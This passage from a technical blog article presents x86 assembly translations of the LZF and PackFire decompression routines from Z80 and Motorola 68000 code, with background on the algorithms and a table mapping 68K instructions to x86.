#000000;\">copyby:</span>  \n    <span style=\"color: #000000;\">movsb</span>                  <span style=\"color: #177500;\">; ldi</span>\n<span style=\"color: #000000;\">mainlo:</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>             <span style=\"color: #177500;\">; call    getbit</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">copyby</span>          <span style=\"color: #177500;\">; jr      nc, copyby</span>\n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #1C01CE;\">1</span>               <span style=\"color: #177500;\">; ld      bc, 1</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">ecx</span>\n<span style=\"color: #000000;\">lenval:</span>  \n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>             <span style=\"color: #177500;\">; call    getbit</span>\n    <span style=\"color: #000000;\">rcl</span>    <span style=\"color: #A90D91;\">cl</span>, <span style=\"color: #1C01CE;\">1</span>           <span style=\"color: #177500;\">; rl      c</span>\n    <span style=\"color: #000000;\">jc</span>     <span style=\"color: #000000;\">exit_depack</span>     <span style=\"color: #177500;\">; ret     c</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>             <span style=\"color: #177500;\">; call    getbit</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">lenval</span>          <span style=\"color: #177500;\">; jr      nc, lenval</span>\n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #A90D91;\">esi</span>             <span style=\"color: #177500;\">; push    hl</span>\n    <span style=\"color: #000000;\">movzx</span>  <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #A90D91;\">byte</span>[<span style=\"color: #A90D91;\">esi</span>]  <span style=\"color: #177500;\">; ld      l, (hl)</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">edi</span>\n    <span style=\"color: #000000;\">sbb</span>    <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">edx</span>        <span style=\"color: #177500;\">; sbc     hl, de</span>\n    <span style=\"color: #000000;\">rep</span>    <span style=\"color: #000000;\">movsb</span>           <span style=\"color: #177500;\">; ldir</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">esi</span>             <span style=\"color: #177500;\">; pop     hl</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">esi</span>             <span style=\"color: #177500;\">; inc     hl</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">mainlo</span>          <span style=\"color: #177500;\">; jr      mainlo</span>\n<span style=\"color: #000000;\">exit_depack:</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">8</span>] <span style=\"color: #177500;\">;</span>\n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">28</span>], <span style=\"color: #A90D91;\">edi</span>\n    <span style=\"color: #000000;\">popad</span>\n    <span style=\"color: #000000;\">ret</span>\n</pre>\n</div>\n<h2 id=\"lzf\">10.4 LZF</h2>\n<p>Designed by <a href=\"https://github.com/encode84\">Ilya Muravyov</a> and <a href=\"https://encode.su/threads/1819-LZF-Optimized-LZF-compressor\">published here</a> in 2013. The x86 assembly is a translation of a <a href=\"https://encode.su/threads/1819-LZF-Optimized-LZF-compressor?p=58323&amp;viewfull=1#post58323\">size-optimized</a> version by <a href=\"http://www.pouet.net/user.php?who=95769\">introspec</a>. The compressor is closed, so this is another example to demonstrate the conversion between Z80 and x86.</p>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #000000;\">lzf_depack:</span>    \n<span style=\"color: #000000;\">_lzf_depack:</span>    \n    <span style=\"color: #000000;\">pushad</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>]   <span style=\"color: #177500;\">; edi = outbuf</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">esi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">8</span>]   <span style=\"color: #177500;\">; esi = inbuf</span>\n    \n    <span style=\"color: #000000;\">xor</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #A90D91;\">ecx</span>          <span style=\"color: #177500;\">; ld b,0 </span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">MainLoop</span>          <span style=\"color: #177500;\">; jr MainLoop  ; all copying is done by LDIR; B needs to be zero</span>\n<span style=\"color: #000000;\">ProcessMatches:</span>        \n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #A90D91;\">eax</span>               <span style=\"color: #177500;\">; exa</span>\n    <span style=\"color: #000000;\">lodsb</span>                    <span style=\"color: #177500;\">; ld a,(hl)</span>\n                             <span style=\"color: #177500;\">; inc hl</span>\n                             <span style=\"color: #177500;\">; rlca  </span>\n                             <span style=\"color: #177500;\">; rlca  </span>\n    <span style=\"color: #000000;\">rol</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">3</span>             <span style=\"color: #177500;\">; rlca </span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">al</span>                <span style=\"color: #177500;\">; inc a</span>\n    <span style=\"color: #000000;\">and</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">00000111b</span>     <span style=\"color: #177500;\">; and %00000111 </span>\n    <span style=\"color: #000000;\">jnz</span>    <span style=\"color: #000000;\">CopyingMatch</span>      <span style=\"color: #177500;\">; jr nz,CopyingMatch</span>\n<span style=\"color: #000000;\">LongMatch:</span>        \n    <span style=\"color: #000000;\">lodsb</span>                    <span style=\"color: #177500;\">; ld a,(hl) </span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">8</span>             <span style=\"color: #177500;\">; add 8</span>\n                             <span style=\"color: #177500;\">; inc hl ; len == 9 means an extra len byte needs to be read</span>\n                             <span style=\"color: #177500;\">; jr nc,CopyingMatch </span>\n                             <span style=\"color: #177500;\">; inc b</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">ch</span>, <span style=\"color: #A90D91;\">ch</span>\n<span style=\"color: #000000;\">CopyingMatch:</span>        \n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">cl</span>, <span style=\"color: #A90D91;\">al</span>            <span style=\"color: #177500;\">; ld c,a </span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">ecx</span>               <span style=\"color: #177500;\">; inc bc </span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">eax</span>               <span style=\"color: #177500;\">; exa </span>\n    <span style=\"color: #000000;\">cmp</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">20h</span>           <span style=\"color: #177500;\">; token == #20 suggests a possibility of the end marker (#20,#00)</span>\n    <span style=\"color: #000000;\">jnz</span>    <span style=\"color: #000000;\">NotTheEnd</span>         <span style=\"color: #177500;\">; jr nz,NotTheEnd </span>\n    <span style=\"color: #000000;\">xor</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #A90D91;\">al</span>            <span style=\"color: #177500;\">; xor a </span>\n    <span style=\"color: #000000;\">cmp</span>    [<span style=\"color: #A90D91;\">esi</span>], <span style=\"color: #A90D91;\">al</span>         <span style=\"color: #177500;\">; cp (hl) </span>\n    <span style=\"color: #000000;\">jz</span>     <span style=\"color: #000000;\">exit</span>              <span style=\"color: #177500;\">; ret z   ; is it the end marker? return if it is</span>\n<span style=\"color: #000000;\">NotTheEnd:</span>\n    <span style=\"color: #000000;\">and</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">1fh</span>           <span style=\"color: #177500;\">; and %00011111 ; A' = high(offset); also, reset flag C for SBC below</span>\n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #A90D91;\">esi</span>               <span style=\"color: #177500;\">; push hl </span>\n    <span style=\"color: #000000;\">movzx</span>  <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #A90D91;\">byte</span>[<span style=\"color: #A90D91;\">esi</span>]    <span style=\"color: #177500;\">; ld l,(hl)  </span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">dh</span>, <span style=\"color: #A90D91;\">al</span>            <span style=\"color: #177500;\">; ld h,a                ; HL = offset</span>\n    <span style=\"color: #000000;\">movsx</span>  <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #A90D91;\">dx</span>           <span style=\"color: #177500;\">; </span>\n                             <span style=\"color: #177500;\">; push de</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">edi</span>          <span style=\"color: #177500;\">; ex de,hl              ; DE = offset, HL = dest</span>\n    <span style=\"color: #000000;\">sbb</span>    <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">edx</span>          <span style=\"color: #177500;\">; sbc hl,de             ; HL = dest-offset</span>\n                             <span style=\"color: #177500;\">; pop de</span>\n    <span style=\"color: #000000;\">rep</span>    <span style=\"color: #000000;\">movsb</span>             <span style=\"color: #177500;\">; ldir</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">esi</span>               <span style=\"color: #177500;\">; pop hl </span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">esi</span>               <span style=\"color: #177500;\">; inc hl</span>\n<span style=\"color: #000000;\">MainLoop:</span>        \n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">al</span>, [<span style=\"color: #A90D91;\">esi</span>]         <span style=\"color: #177500;\">; ld a,(hl) </span>\n    <span style=\"color: #000000;\">cmp</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">20h</span>           <span style=\"color: #177500;\">; cp #20  </span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">ProcessMatches</span>    <span style=\"color: #177500;\">; jr nc,ProcessMatches  ; tokens \"000lllll\" mean \"copy lllll+1 literals\"</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">al</span>                <span style=\"color: #177500;\">; inc a </span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">cl</span>, <span style=\"color: #A90D91;\">al</span>            <span style=\"color: #177500;\">; ld c,a </span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">esi</span>               <span style=\"color: #177500;\">; inc hl </span>\n    <span style=\"color: #000000;\">rep</span>    <span style=\"color: #000000;\">movsb</span>             <span style=\"color: #177500;\">; ldir   ; actual copying of the literals</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">MainLoop</span>          <span style=\"color: #177500;\">; jr MainLoop</span>\n<span style=\"color: #000000;\">exit:</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>]\n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">28</span>], <span style=\"color: #A90D91;\">edi</span>\n    <span style=\"color: #000000;\">popad</span>\n    <span style=\"color: #000000;\">ret</span>\n</pre>\n</div>\n<h2 id=\"68k\">11. Motorola 68000 (68K)</h2>\n<p><em>&#8220;Motorola, with its superior technology, lost the single most important design contest of the last 50 years&#8221;</em> <a href=\"https://en.wikipedia.org/wiki/Wally_Rhines\">Walden C. Rhines</a></p>\n<p>A revolutionary CPU released in 1979 that includes eight 32-Bit general-purpose data registers (D0-D7), and eight address registers (A0-A7) used for function arguments and stack pointer. The 68K was used in the <a href=\"http://oldcomputers.net/amiga1000.html\">Commodore Amiga</a>, the <a href=\"http://oldcomputers.net/atari520st.html\">Atari ST</a>, the <a href=\"http://oldcomputers.net/macintosh.html\">Macintosh</a>, including various fourth-generation gaming consoles like the Sega Megadrive, and arcade systems like <a href=\"http://www.system16.com/hardware.php?id=525\">Namco System 2</a>. The 68K was more compelling than the Z80, 6502, 8088, and 8086, so why did it lose to Intel in the home computer war of the 1980s? <a href=\"https://arstechnica.com/gaming/2017/01/a-history-of-the-amiga-part-10-the-downfall-of-commodore/\">A history of the Amiga, part 10: The downfall of Commodore</a> offers some plausible answers. IBM choosing Control Program/Monitor by Gary Kildall for its 1980 PC operating system is also likely a factor.</p>\n<p>The following table lists some 68K instructions and the x86 instructions used to replace them.</p>\n<table id=\"t01\">\n<tr>\n<th>68K</th>\n<th>x86</th>\n<th>Description</th>\n</tr>\n<tr>\n<td>move</td>\n<td>mov</td>\n<td>Copy data from source to destination</td>\n</tr>\n<tr>\n<td>add</td>\n<td>add</td>\n<td>Add binary.</td>\n</tr>\n<tr>\n<td>addx</td>\n<td>adc</td>\n<td>Add with borrow/carry.</td>\n</tr>\n<tr>\n<td>sub</td>\n<td>sub</td>\n<td>Subtract binary.</td>\n</tr>\n<tr>\n<td>subx</td>\n<td>sbb</td>\n<td>Subtract with borrow/carry.</td>\n</tr>\n<tr>\n<td>rts</td>\n<td>ret</td>\n<td>Return from subroutine.</td>\n</tr>\n<tr>\n<td>dbf/dbt</td>\n<td>loopne/loope</td>\n<td>Test condition, decrement, and branch.</td>\n</tr>\n<tr>\n<td>bsr</td>\n<td>call</td>\n<td>Branch to subroutine</td>\n</tr>\n<tr>\n<td>bcs:bcc</td>\n<td>jc:jnc</td>\n<td>Branch/Jump if carry set. Jump if carry clear.</td>\n</tr>\n<tr>\n<td>beq:bne</td>\n<td>je:jne</td>\n<td>Branch/Jump if equal. Not equal.</td>\n</tr>\n<tr>\n<td>ble</td>\n<td>jle</td>\n<td>Branch/Jump if less than or equal.</td>\n</tr>\n<tr>\n<td>bra</td>\n<td>jmp</td>\n<td>Branch always.</td>\n</tr>\n<tr>\n<td>lsr</td>\n<td>shr</td>\n<td>Logical shift right.</td>\n</tr>\n<tr>\n<td>lsl</td>\n<td>shl</td>\n<td>Logical shift left.</td>\n</tr>\n<tr>\n<td>bhs</td>\n<td>jae</td>\n<td>Branch on higher than or same.</td>\n</tr>\n<tr>\n<td>bpl</td>\n<td>jns</td>\n<td>Branch on higher than or same.</td>\n</tr>\n<tr>\n<td>bmi</td>\n<td>js</td>\n<td>Branch on minus. Jump if signed.</td>\n</tr>\n<tr>\n<td>tst</td>\n<td>test</td>\n<td>Test bit zero of a register.</td>\n</tr>\n<tr>\n<td>exg</td>\n<td>xchg</td>\n<td>Exchange registers.</td>\n</tr>\n</table>\n<h2 id=\"packfire\">11.1 PackFire</h2>\n<p>Designed by <a href=\"http://neural.untergrund.net/\">neural</a> and <a href=\"http://www.pouet.net/prod.php?which=54840\">published in 2010</a>, PackFire comprises two algorithms tailored for demos targeting the <a href=\"https://www.old-computers.com/museum/computer.asp?c=20\">Atari ST</a>. The first borrows ideas from Exomizer and is suitable for small files not exceeding ~40KB. The other borrows ideas from LZMA, which is more suited to compressing larger files. The LZMA-variant requires 16KB of RAM for the range decoder, which isn\u2019t a problem for the Atari ST with between 512-1024KB of RAM available. However, translating code written for the 68K to x86 isn\u2019t easy because the x86 is a less advanced architecture. Since being released, <a href=\"http://jiggawatt.org/badc0de/decrunch/\">badc0de</a> has published decoders for a variety of other architectures, including 32-Bit ARM. The following is the Exomizer-style decoder for files not exceeding ~40KB, which probably isn\u2019t very useful unless you write demos for retro hardware.</p>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #000000;\">packfire_depack:</span>    \n<span style=\"color: #000000;\">_packfire_depack:</span>    \n    <span style=\"color: #000000;\">pushad</span>\n    \n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">ebp</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>]   <span style=\"color: #177500;\">; eax = inbuf (a0)</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">8</span>]   <span style=\"color: #177500;\">; edi = outbuf (a1)</span>\n    \n    <span style=\"color: #000000;\">lea</span>    <span style=\"color: #A90D91;\">esi</span>, [<span style=\"color: #A90D91;\">ebp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">26</span>]     <span style=\"color: #177500;\">; lea     26(a0),a2</span>\n    <span style=\"color: #000000;\">lodsb</span>                    <span style=\"color: #177500;\">; move.b  (a2)+,d7</span>\n<span style=\"color: #000000;\">lit_copy:</span>               \n    <span style=\"color: #000000;\">movsb</span>                    <span style=\"color: #177500;\">; move.b  (a2)+,(a1)+</span>\n<span style=\"color: #000000;\">main_loop:</span>              \n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">get_bit</span>           <span style=\"color: #177500;\">; bsr.b   get_bit</span>\n    <span style=\"color: #000000;\">jc</span>     <span style=\"color: #000000;\">lit_copy</span>          <span style=\"color: #177500;\">; bcs.b   lit_copy</span>\n    \n    <span style=\"color: #000000;\">cdq</span>                      <span style=\"color: #177500;\">; moveq   #-1,d3</span>\n    <span style=\"color: #000000;\">dec</span>    <span style=\"color: #A90D91;\">edx</span>\n<span style=\"color: #000000;\">get_index:</span>              \n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">edx</span>               <span style=\"color: #177500;\">; addq.l  #1,d3</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">get_bit</span>           <span style=\"color: #177500;\">; bsr.b   get_bit</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">get_index</span>         <span style=\"color: #177500;\">; bcc.b   get_index</span>\n    \n    <span style=\"color: #000000;\">cmp</span>    <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #1C01CE;\">0x10</span>         <span style=\"color: #177500;\">; cmp.w   #$10,d3</span>\n    <span style=\"color: #000000;\">je</span>     <span style=\"color: #000000;\">depack_stop</span>       <span style=\"color: #177500;\">; beq.b   depack_stop</span>\n    \n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">get_pair</span>          <span style=\"color: #177500;\">; bsr.b   get_pair</span>\n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #A90D91;\">edx</span>               <span style=\"color: #177500;\">; move.w  d3,d6 ; save it for the copy</span>\n    <span style=\"color: #000000;\">cmp</span>    <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #1C01CE;\">2</span>            <span style=\"color: #177500;\">; cmp.w   #2,d3</span>\n    <span style=\"color: #000000;\">jle</span>    <span style=\"color: #000000;\">out_of_range</span>      <span style=\"color: #177500;\">; ble.b   out_of_range</span>\n    \n    <span style=\"color: #000000;\">cdq</span>                      <span style=\"color: #177500;\">; moveq   #0,d3</span>\n<span style=\"color: #000000;\">out_of_range:</span>\n                             <span style=\"color: #177500;\">; move.b  table_len(pc,d3.w),d1</span>\n                             <span style=\"color: #177500;\">; move.b  table_dist(pc,d3.w),d0</span>\n    <span style=\"color: #177500;\">; code without tables</span>\n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #1C01CE;\">4</span>                 <span style=\"color: #177500;\">; d1 = 4</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #1C01CE;\">16</span>                <span style=\"color: #177500;\">; d0 = 16</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">ebx</span>\n    <span style=\"color: #000000;\">dec</span>    <span style=\"color: #A90D91;\">edx</span>               <span style=\"color: #177500;\">; d3--</span>\n    <span style=\"color: #000000;\">js</span>     <span style=\"color: #000000;\">L0</span>\n    \n    <span style=\"color: #000000;\">dec</span>    <span style=\"color: #A90D91;\">edx</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">cl</span>, <span style=\"color: #1C01CE;\">2</span>             <span style=\"color: #177500;\">; d1 = 2</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">bl</span>, <span style=\"color: #1C01CE;\">48</span>            <span style=\"color: #177500;\">; d0 = 48</span>\n    <span style=\"color: #000000;\">js</span>     <span style=\"color: #000000;\">L0</span>\n    \n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">cl</span>, <span style=\"color: #1C01CE;\">4</span>             <span style=\"color: #177500;\">; d1 = 4</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">bl</span>, <span style=\"color: #1C01CE;\">32</span>            <span style=\"color: #177500;\">; d0 = 32</span>\n<span style=\"color: #000000;\">L0:</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">get_bits</span>          <span style=\"color: #177500;\">; bsr.b   get_bits</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">get_pair</span>          <span style=\"color: #177500;\">; bsr.b   get_pair</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #A90D91;\">esi</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">edi</span>          <span style=\"color: #177500;\">; move.l  a1,a3</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">edx</span>          <span style=\"color: #177500;\">; sub.l   d3,a3</span>\n<span style=\"color: #000000;\">copy_bytes:</span>             \n    <span style=\"color: #000000;\">rep</span>    <span style=\"color: #000000;\">movsb</span>             <span style=\"color: #177500;\">; move.b  (a3)+,(a1)+</span>\n                             <span style=\"color: #177500;\">; subq.w  #1,d6</span>\n                             <span style=\"color: #177500;\">; bne.b   copy_bytes</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">esi</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">main_loop</span>         <span style=\"color: #177500;\">; bra.b   main_loop</span>\n<span style=\"color: #000000;\">get_pair:</span>\n    <span style=\"color: #000000;\">pushad</span>\n    <span style=\"color: #000000;\">cdq</span>                      <span style=\"color: #177500;\">; sub.l   a6,a6</span>\n                             <span style=\"color: #177500;\">; moveq   #$f,d2</span>\n<span style=\"color: #000000;\">calc_len_dist:</span>          \n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">ebx</span>, <span style=\"color: #A90D91;\">edx</span>          <span style=\"color: #177500;\">; move.w  a6,d0</span>\n    <span style=\"color: #000000;\">and</span>    <span style=\"color: #A90D91;\">ebx</span>, <span style=\"color: #1C01CE;\">15</span>           <span style=\"color: #177500;\">; and.w   d2,d0</span>\n    <span style=\"color: #000000;\">jne</span>    <span style=\"color: #000000;\">node</span>              <span style=\"color: #177500;\">; bne.b   node</span>\n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #1C01CE;\">1</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">edi</span>               <span style=\"color: #177500;\">; moveq   #1,d5</span>\n<span style=\"color: #000000;\">node:</span>                   \n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">eax</span>, <span style=\"color: #A90D91;\">edx</span>          <span style=\"color: #177500;\">; move.w  a6,d4</span>\n    <span style=\"color: #000000;\">shr</span>    <span style=\"color: #A90D91;\">eax</span>, <span style=\"color: #1C01CE;\">1</span>            <span style=\"color: #177500;\">; lsr.w   #1,d4    </span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">cl</span>, [<span style=\"color: #A90D91;\">ebp</span><span style=\"color: #000000;\">+</span><span style=\"color: #A90D91;\">eax</span>]     <span style=\"color: #177500;\">; move.b  (a0,d4.w),d1</span>\n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #1C01CE;\">1</span>                 <span style=\"color: #177500;\">; moveq   #1,d4</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">eax</span>\n    <span style=\"color: #000000;\">and</span>    <span style=\"color: #A90D91;\">ebx</span>, <span style=\"color: #A90D91;\">eax</span>          <span style=\"color: #177500;\">; and.w   d4,d0</span>\n    <span style=\"color: #000000;\">je</span>     <span style=\"color: #000000;\">nibble</span>            <span style=\"color: #177500;\">; beq.b   nibble</span>\n    <span style=\"color: #000000;\">shr</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #1C01CE;\">4</span>            <span style=\"color: #177500;\">; lsr.b   #4,d1</span>\n<span style=\"color: #000000;\">nibble:</span>                 \n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">ebx</span>, <span style=\"color: #A90D91;\">edi</span>          <span style=\"color: #177500;\">; move.w  d5,d0</span>\n    <span style=\"color: #000000;\">and</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #1C01CE;\">15</span>           <span style=\"color: #177500;\">; and.w   d2,d1</span>\n    <span style=\"color: #000000;\">shl</span>    <span style=\"color: #A90D91;\">eax</span>, <span style=\"color: #A90D91;\">cl</span>           <span style=\"color: #177500;\">; lsl.l   d1,d4</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">edi</span>, <span style=\"color: #A90D91;\">eax</span>          <span style=\"color: #177500;\">; add.l   d4,d5</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">edx</span>               <span style=\"color: #177500;\">; addq.w  #1,a6</span>\n\n    <span style=\"color: #177500;\">; dbf  d3,calc_len_dist</span>\n    <span style=\"color: #000000;\">dec</span>    <span style=\"color: #A90D91;\">dword</span>[<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+pushad_t.edx</span>] \n    <span style=\"color: #000000;\">jns</span>    <span style=\"color: #000000;\">calc_len_dist</span>\n    <span style=\"color: #177500;\">; save d0 and d1</span>\n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+pushad_t.ebx</span>], <span style=\"color: #A90D91;\">ebx</span>\n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+pushad_t.ecx</span>], <span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #000000;\">popad</span>\n<span style=\"color: #000000;\">get_bits:</span>               \n    <span style=\"color: #000000;\">cdq</span>                      <span style=\"color: #177500;\">; moveq   #0,d3</span>\n<span style=\"color: #000000;\">getting_bits:</span>           \n    <span style=\"color: #000000;\">dec</span>    <span style=\"color: #A90D91;\">ecx</span>               <span style=\"color: #177500;\">; subq.b  #1,d1</span>\n    <span style=\"color: #000000;\">jns</span>    <span style=\"color: #000000;\">cont_get_bit</span>      <span style=\"color: #177500;\">; bhs.b   cont_get_bit</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #A90D91;\">ebx</span>          <span style=\"color: #177500;\">; add.w   d0,d3</span>\n    <span style=\"color: #000000;\">ret</span>\n<span style=\"color: #000000;\">depack_stop:</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">8</span>]   <span style=\"color: #177500;\">; </span>\n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+pushad_t.eax</span>], <span style=\"color: #A90D91;\">edi</span>\n    <span style=\"color: #000000;\">popad</span>\n    <span style=\"color: #000000;\">ret</span>                      <span style=\"color: #177500;\">; rts</span>\n<span style=\"color: #000000;\">cont_get_bit:</span>           \n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">get_bit</span>           <span style=\"color: #177500;\">; bsr.b   get_bit</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #A90D91;\">edx</span>          <span style=\"color: #177500;\">; addx.l  d3,d3</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">getting_bits</span>      <span style=\"color: #177500;\">; bra.b   getting_bits</span>\n<span style=\"color: #000000;\">get_bit:</span>                \n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #A90D91;\">al</span>            <span style=\"color: #177500;\">; add.b   d7,d7</span>\n    <span style=\"color: #000000;\">jne</span>    <span style=\"color: #A90D91;\">byte</span><span 